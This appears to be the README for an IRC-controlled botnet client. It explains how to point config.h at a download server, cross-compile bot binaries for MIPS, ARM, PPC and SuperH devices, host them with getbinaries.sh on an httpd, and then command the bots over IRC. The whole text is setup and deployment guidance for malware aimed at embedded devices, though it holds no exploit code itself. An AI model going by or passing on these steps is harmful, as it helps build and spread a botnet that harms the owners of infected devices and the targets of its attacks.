Config.h
--------


**IMPORTANT:** `REFERENCE_HTTP` in **include/config.h** must be the server where you upload the binaries (mipsel, mips, arm, ppc, sh4) and **getbinaries.sh**. 
If you change the `name of binaries` you must update the **Makefile** and **getbinaries.sh** too.

```bash
deftcode ~ $ vi include/config.h
```

Build binaries
--------------

```bash
deftcode ~ $ make x86_32 (for 32bit)
deftcode ~ $ make x86_64 (for 64bit)
deftcode ~ # ./bin/x86_64
```

Build binaries for MIPSEL, MIPS, ARM, PPC, SUPERH

```bash
deftcode ~ $ make mipsel mips arm ppc superh
```

Now start your httpd and upload the binaries and getbinaries.sh
Now go to IRC server and command your bot.

BUGS
----

If you find bugs (which is quite likely), please submit them to <eurialo@deftcode.ninja>
